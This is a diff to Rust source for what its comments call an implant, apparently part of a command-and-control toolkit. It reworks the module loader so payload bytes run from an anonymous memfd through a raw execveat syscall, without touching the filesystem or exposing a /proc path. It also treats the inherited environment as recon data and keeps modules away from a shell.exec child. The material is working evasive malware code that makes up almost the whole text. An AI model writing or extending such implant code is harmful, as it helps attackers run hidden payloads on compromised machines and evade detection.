@@ -423,15 +423,18 @@ fn load_library(bytes: &[u8]) -> Result<Box<dyn Library>, String> {
 #[cfg(unix)]
 mod executed {
     //! The Linux module shape (architecture.md Sec 5.4): the bytes stage in
-    //! a memfd and the loader execs them through `/proc/self/fd` -- the
-    //! loader tier's own mechanism (Sec 6) -- with the string grammar
-    //! spoken over stdio as length-prefixed request/response frames. One
-    //! process per exchange; a verb dispatch is a fresh child, so a module
-    //! that dies cannot take the implant with it, and the shape carries no
-    //! libc coupling: the static musl artifact loads modules exactly like
-    //! any other.
+    //! a memfd and the loader execs them through the anonymous fd --
+    //! `execveat(AT_EMPTY_PATH)`, the loader tier's own syscall (Sec 6), no
+    //! `/proc` path in sight -- with the string grammar spoken over stdio
+    //! as length-prefixed request/response frames. One process per
+    //! exchange; a verb dispatch is a fresh child, so a module that dies
+    //! cannot take the implant with it, and the shape carries no libc
+    //! coupling: the static musl artifact loads modules exactly like any
+    //! other.
 
+    use std::ffi::CString;
     use std::io::{Read, Write};
+    use std::os::unix::ffi::OsStringExt;
     use std::os::unix::process::CommandExt;
     use std::process::{Command, Stdio};
 
@@ -471,10 +474,12 @@ mod executed {
 
     impl ExecLibrary {
         /// Stages the bytes in a memfd -- nothing lands on the filesystem
-        /// at any step -- and defers execution to each exchange.
+        /// at any step -- and defers execution to each exchange. The fd is
+        /// close-on-exec: the exec that consumes it is `execveat` itself,
+        /// and no other child (a shell.exec, say) inherits the module.
         pub fn load(bytes: &[u8]) -> Result<Box<dyn Library>, String> {
             let name = c"rod-module";
-            let fd = unsafe { libc::memfd_create(name.as_ptr(), 0) };
+            let fd = unsafe { libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC) };
             if fd < 0 {
                 return Err(format!(
                     "module.load: memfd_create: errno {}",
@@ -505,13 +510,9 @@ mod executed {
         /// One request/response exchange over a fresh process: exec the
         /// memfd, write the frame, read the answer, reap.
         fn exchange(&self, op: u8, arg: u32, payload: &[u8]) -> Result<(u8, Vec<u8>), String> {
-            let path = format!("/proc/self/fd/{}", self.fd);
-            let mut child = Command::new(&path)
-                .arg0("rod-module")
-                .stdin(Stdio::piped())
-                .stdout(Stdio::piped())
-                .spawn()
-                .map_err(|err| format!("exec {path}: {err}"))?;
+            let mut child = self
+                .spawn_module()
+                .map_err(|err| format!("execveat the staged module: {err}"))?;
 
             let mut frame = Vec::with_capacity(9 + payload.len());
             frame.push(op);
@@ -552,6 +553,101 @@ mod executed {
                 .map_err(|err| format!("the module's answer ended early: {err}"))?;
             let _ = child.wait();
             Ok((header[1], body))
+        }
+    }
+
+    /// Everything `execveat` points at, built before the fork: the
+    /// pre-exec closure may only read stable addresses and issue the
+    /// syscall (the async-signal-safe discipline `pre_exec` demands), so
+    /// the argv and envp arrays exist up front and the closure is a
+    /// function call on the whole struct. The function boundary is
+    /// load-bearing: edition-2021 closures capture disjoint fields, and a
+    /// bare array of raw pointers is not `Send` however the owning struct
+    /// is declared.
+    struct Spawn {
+        empty: CString,
+        // Ownership anchors: argv and envp point into these allocations,
+        // which is a read the borrow checker cannot see.
+        #[allow(dead_code)]
+        argv0: CString,
+        argv: [*const std::ffi::c_char; 2],
+        #[allow(dead_code)]
+        env: Vec<CString>,
+        envp: Vec<*const std::ffi::c_char>,
+        fd: i32,
+    }
+
+    // The pointers are into the struct's own heap allocations and the fd
+    // is a plain kernel handle; both ride the fork safely.
+    unsafe impl Send for Spawn {}
+    unsafe impl Sync for Spawn {}
+
+    impl Spawn {
+        /// Snapshots the environment the module should see -- the
+        /// implant's own, the same inheritance a compiled handler's child
+        /// gets, and recon data in its own right (USER, PATH, HOSTNAME).
+        fn new(fd: i32) -> Spawn {
+            let argv0 = CString::new("rod-module").expect("no NUL in the argv");
+            let argv = [argv0.as_ptr(), std::ptr::null()];
+            let env: Vec<CString> = std::env::vars_os()
+                .filter_map(|(name, value)| {
+                    let mut pair = name;
+                    pair.push("=");
+                    pair.push(value);
+                    // An interior NUL cannot ride a C string; an
+                    // environment entry carrying one is dropped, not fatal.
+                    CString::new(pair.into_vec()).ok()
+                })
+                .collect();
+            let mut envp: Vec<*const std::ffi::c_char> =
+                env.iter().map(|entry| entry.as_ptr()).collect();
+            envp.push(std::ptr::null());
+            Spawn {
+                empty: CString::new("").expect("no NUL in the empty path"),
+                argv0,
+                argv,
+                env,
+                envp,
+                fd,
+            }
+        }
+    }
+
+    // The only step between fork and exec: hand the anonymous fd to the
+    // kernel as the new image. Returning at all means the exec failed.
+    // Routed through the raw syscall number rather than libc's typed
+    // wrapper: the musl bindings carry SYS_execveat but no execveat
+    // function, and one path serves both libcs.
+    fn exec_module(spawn: &Spawn) -> std::io::Result<()> {
+        let result = unsafe {
+            libc::syscall(
+                libc::SYS_execveat,
+                spawn.fd,
+                spawn.empty.as_ptr(),
+                spawn.argv.as_ptr() as *const libc::c_char,
+                spawn.envp.as_ptr() as *const libc::c_char,
+                libc::AT_EMPTY_PATH,
+            ) as libc::c_int
+        };
+        debug_assert!(result != 0, "execveat returned without exec'ing");
+        Err(std::io::Error::last_os_error())
+    }
+
+    impl ExecLibrary {
+        /// Spawns one module process off the staged fd. The program string
+        /// never runs -- the pre-exec closure has already replaced the
+        /// image by the time std's own exec would act -- and the module
+        /// inherits the implant's environment through the prepared envp.
+        fn spawn_module(&self) -> Result<std::process::Child, std::io::Error> {
+            let spawn = Spawn::new(self.fd);
+            let mut command = Command::new("rod-module");
+            unsafe {
+                command
+                    .pre_exec(move || exec_module(&spawn))
+                    .stdin(Stdio::piped())
+                    .stdout(Stdio::piped());
+            }
+            command.spawn()
         }
     }
 
